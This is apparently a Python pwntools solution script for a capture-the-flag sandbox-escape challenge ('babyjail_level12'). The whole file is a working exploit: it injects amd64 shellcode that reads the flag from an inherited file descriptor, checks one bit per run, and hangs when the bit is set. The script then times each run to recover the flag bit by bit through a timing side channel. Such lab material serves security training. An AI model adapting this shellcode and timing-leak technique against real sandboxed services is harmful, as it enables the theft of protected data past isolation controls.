from pwn import *
import os
import time

context.arch = 'amd64'
context.encoding ='latin'
context.log_level = 'INFO'
warnings.simplefilter('ignore')

iter_progress = log.progress("PROGRESS")
flag_prog = log.progress("FLAG")
flag = ""

for i in range(0, 55):
    biny = ''
    for pwr in range (6, -1, -1): 
        iter_progress.status(f"ITERATION {i}, BIT {pwr}")

        assembly = asm(f""" 
        xor rax, rax
        mov rdi, 3
        mov rsi, rsp
        mov rdx, 55 
        syscall

        mov rdi, 0
        mov dil, byte ptr [rsp+{i}]
        
        mov r8, {pow(2, pwr)}

        mov r9, rdi
        and r9, r8
        cmp r9, r8 
        jne fail

        loop:
        jmp loop

        fail:
        """)
        start_time = time.time()
        with process(["/challenge/babyjail_level12", "/flag"], level='CRITICAL', alarm=3) as p:
            # info(p.readrepeat(1))
            p.send(assembly)
            # info(p.readrepeat(1))
            # info(f"exit: {p.poll(True)}")
            # flag = flag + chr(p.poll(True))
            p.poll(True)
        if time.time()-start_time > 2: 
            biny += f"1"
        else:
            biny += f"0"

    flag += chr(int(biny, 2))
    flag_prog.status(repr(flag))

print(flag)